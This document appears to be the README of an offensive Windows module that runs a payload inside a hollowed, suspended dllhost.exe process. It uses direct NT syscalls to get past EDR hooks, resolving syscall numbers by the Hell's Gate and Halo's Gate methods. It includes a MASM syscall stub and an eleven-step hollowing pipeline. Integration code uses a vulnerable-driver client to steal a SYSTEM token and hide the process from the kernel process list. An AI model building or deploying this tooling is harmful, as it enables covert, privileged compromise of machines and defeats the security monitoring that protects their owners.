# Process Hollowing — In-Memory Execution Module

> Fileless payload execution via process hollowing with a direct NT syscall engine. All sensitive kernel operations bypass EDR hooks in `ntdll.dll` using a three-stage SSN resolution chain: Hell's Gate, Halo's Gate, and fresh-copy fallback.

---

## Overview

Most EDR products intercept malicious behaviour by patching the stubs of sensitive NT functions in `ntdll.dll` — replacing the `syscall` instruction with a jump to a monitoring routine. Any process that calls `NtAllocateVirtualMemory` or `NtWriteVirtualMemory` through the normal Windows API path will hit these hooks.

The process hollowing module avoids this entirely. Rather than calling any Windows API function for sensitive operations, it resolves the underlying NT syscall service numbers (SSNs) at runtime and issues raw `syscall` instructions directly. The EDR's hooks in `ntdll.dll` are never reached.

The module:

1. Resolves SSNs at runtime — adapting to different Windows versions and to environments where `ntdll.dll` has been modified by an EDR
2. Spawns `dllhost.exe` as a suspended host process — a trusted Windows component that raises no suspicion by existing
3. Replaces `dllhost.exe`'s memory image with a payload binary using direct syscalls
4. Redirects execution to the payload's entry point and resumes the thread

The result is the payload running inside a legitimate Windows host process. Its image base and PEB are updated to match the payload, and the process appears to external observers as a normal `dllhost.exe` instance.

---

## Hell's Gate — SSN Resolution Chain

Before issuing any direct syscall, the module resolves the SSN for the target NT function. Three methods are tried in order:

### Stage 1: Hell's Gate

Reads the SSN directly from the in-memory `ntdll.dll` stub. The NT stub pattern is:

```asm
4C 8B D1        mov  r10, rcx
B8 XX 00 00 00  mov  eax, <ssn>   ; ← SSN is at byte offset +4
0F 05           syscall
C3              ret
```

If the first byte is `0xE9` (a JMP — indicating an EDR hook), Hell's Gate fails and the next stage is tried.

### Stage 2: Halo's Gate

When the target stub is hooked, the SSN cannot be read directly. However, NT syscall stubs are sorted by SSN and laid out contiguously in memory — adjacent stubs differ by exactly 1 in their SSN. Halo's Gate scans up to 10 stubs forward and backward from the hooked stub, finds one that is clean, reads its SSN, and computes the target SSN by adding or subtracting the index offset.

```
hooked:    NtAllocateVirtualMemory  (SSN unknown — stub patched)
fwd +1:    NtAllocateVirtualMemoryEx  SSN = 0x1a → target = 0x1a - 1 = 0x19
```

### Stage 3: Fresh Copy

If both in-memory methods fail (e.g., the EDR has hooked multiple consecutive stubs), the module maps a clean copy of `ntdll.dll` directly from disk using `CreateFileMapping` + `MapViewOfFile` and reads the SSN from the on-disk image, which is unmodified.

```
CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, ...)
CreateFileMappingA(..., PAGE_READONLY | SEC_IMAGE, ...)
MapViewOfFile(...)
→ parse export directory → find function → read SSN from stub
```

---

## Direct Syscall Stub

The low-level syscall dispatch is implemented in MASM:

```asm
; syscall_stub.asm
; Build with MASM: Visual Studio → Build Customizations → masm

DirectSyscall PROC
    mov  r10, rdx    ; shift args: Windows x64 syscall ABI uses r10 for the 1st arg
    mov  eax, ecx    ; SSN passed as the first argument (ecx in __fastcall)
    mov  rcx, r8     ; shift remaining args into position
    mov  rdx, r9
    syscall
    ret
DirectSyscall ENDP
end
```

This stub is declared in C++ as:

```cpp
extern "C" NTSTATUS DirectSyscall(DWORD ssn, ...);
```

Callers resolve the SSN for their target function, then call `DirectSyscall(ssn, arg1, arg2, ...)`. The stub places the SSN in `eax` and issues `syscall` directly, bypassing `ntdll.dll` entirely.

---

## Hollowing Pipeline

`RunHollowPipeline()` performs the complete operation in eleven steps:

```
Step 0 ── Read payload PE from disk
          ReadPayloadFromDisk("C:\\Users\\Public\\payload.exe")
          Validates DOS signature and NT headers before proceeding.
          │
Step 1 ── Spawn dllhost.exe suspended
          CreateProcessA("C:\\Windows\\System32\\dllhost.exe", ..., CREATE_SUSPENDED)
          dllhost.exe is a trusted Windows component — its presence raises no alerts.
          Returns: PROCESS_INFORMATION {hProcess, hThread, dwProcessId, dwThreadId}
          │
Step 2 ── Read thread context               [DIRECT SYSCALL]
          NtGetContextThread(hThread, &ctx)
          CONTEXT_FULL — captures all registers including RIP, RCX, RSP.
          │
Step 3 ── Locate PEB and dllhost image base
          NtQueryInformationProcess → PROCESS_BASIC_INFORMATION → PebBaseAddress
          ReadProcessMemory(PEB + 0x10) → dllhost's current ImageBase
          │
Step 4 ── Unmap dllhost's image             [DIRECT SYSCALL]
          NtUnmapViewOfSection(hProcess, dllhostImageBase)
          The process memory space is now empty — "hollow."
          │
Step 5 ── Allocate memory for payload       [DIRECT SYSCALL]
          NtAllocateVirtualMemory(hProcess, preferredBase, SizeOfImage, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
          Attempts to allocate at the payload's preferred ImageBase first.
          Falls back to OS-assigned address if the preferred base is occupied.
          │
Step 6 ── Write PE headers                  [DIRECT SYSCALL]
          NtWriteVirtualMemory(hProcess, allocBase, payload, SizeOfHeaders)
          │
Step 7 ── Write PE sections                 [DIRECT SYSCALL]
          For each section in the payload's section table:
          NtWriteVirtualMemory(hProcess, allocBase + section.VirtualAddress, ...)
          │
Step 8 ── Apply base relocations
          If allocBase ≠ payload.ImageBase:
          Walk IMAGE_BASE_RELOCATION table, apply IMAGE_REL_BASED_DIR64 fixups
          via ReadProcessMemory + WriteProcessMemory.
          │
Step 9 ── Update PEB ImageBase
          WriteProcessMemory(PEB + 0x10, &allocBase)
          The PEB now reflects the payload — process introspection sees the correct base.
          │
Step 10 ─ Redirect entry point              [DIRECT SYSCALL]
          newEntry = allocBase + payload.AddressOfEntryPoint
          ctx.Rcx = newEntry
          NtSetContextThread(hThread, &ctx)
          │
Step 11 ─ Resume execution                  [DIRECT SYSCALL]
          NtResumeThread(hThread, &suspendCount)
          The thread starts executing at the payload's entry point inside dllhost.exe.
          Returns: hollowedPid
```

---

## Syscall Wrappers

Each NT function used in the pipeline has a typed C++ wrapper that resolves its SSN and dispatches through `DirectSyscall`:

| Wrapper | NT Function | Purpose |
|---|---|---|
| `Syscall_NtGetContextThread` | `NtGetContextThread` | Read full CPU context of a suspended thread |
| `Syscall_NtUnmapViewOfSection` | `NtUnmapViewOfSection` | Unmap the host process's own image |
| `Syscall_NtAllocateVirtualMemory` | `NtAllocateVirtualMemory` | Allocate RWX region in remote process |
| `Syscall_NtWriteVirtualMemory` | `NtWriteVirtualMemory` | Write payload headers and sections |
| `Syscall_NtSetContextThread` | `NtSetContextThread` | Redirect thread RCX to payload entry |
| `Syscall_NtResumeThread` | `NtResumeThread` | Resume the hollowed thread |

---

## Public API

```cpp
// hollow.h
#pragma once
#include <windows.h>

// Performs the full hollowing pipeline.
// Returns the PID of the hollowed dllhost.exe process on success, 0 on failure.
DWORD RunHollowPipeline();
```

The payload is read from `C:\Users\Public\payload.exe`. This path is the agreed handoff point between the Polaris compiler pipeline (which produces the binary) and this module (which loads it). Change `ReadPayloadFromDisk` if a different delivery path is used.

---

## Integration with the BYOVD Client

The BYOVD client (`byovd/client/client.cpp`) calls this module and then uses the kernel driver to hide the hollowed process:

```cpp
#include "../../processhollowing/hollow.h"

// 1. Escalate to SYSTEM first so the hollowed process inherits the token
DeviceIoControl(hDevice, IOCTL_JOCKY_STEAL_TOKEN, &currentPidInput, ...);

// 2. Run the hollowing pipeline
DWORD hollowedPid = RunHollowPipeline();

// 3. Hide the hollowed process from the kernel process list
JOCKY_PID_INPUT hideInput = { hollowedPid };
DeviceIoControl(hDevice, IOCTL_JOCKY_HIDE_PROCESS, &hideInput, ...);
```

After step 3, `dllhost.exe` is running the payload at SYSTEM integrity, and it is invisible to any process enumeration that walks `PsActiveProcessLinks`.

---

## Building

The module is a header-only include in `hollow.h` with the implementation in `hollow.cpp`. Add both files to any Visual Studio C++ project targeting Windows x64.

Enable MASM for the `DirectSyscall` stub: **Project → Build Customizations → masm** (or add `syscall_stub.asm` to the project and set **Item Type → Microsoft Macro Assembler**).

The module links against `kernel32.lib` only — no other libraries are required.

---

## Directory Layout

```
processhollowing/
├── hollow.h         Public API declaration — RunHollowPipeline()
├── hollow.cpp       Full implementation:
│                     - SSN resolution (Hell's Gate, Halo's Gate, Fresh Copy)
│                     - DirectSyscall extern declaration
│                     - Typed NT syscall wrappers
│                     - PE relocation processing
│                     - 11-step hollowing pipeline
└── payload.cpp      Standalone test payload for validating the hollowing setup
```

---

## Relationship to Other Components

| Component | Relationship |
|---|---|
| `byovd/` | Calls `RunHollowPipeline()` from `client.cpp`; uses the kernel driver to then hide the PID this module returns |
| `compiler/` | The Polaris pipeline produces the `payload.exe` this module loads from disk |
| `endpoint-management-server/` | Telemetry from the hollowed process is submitted back to the management server via the agent's bearer token |
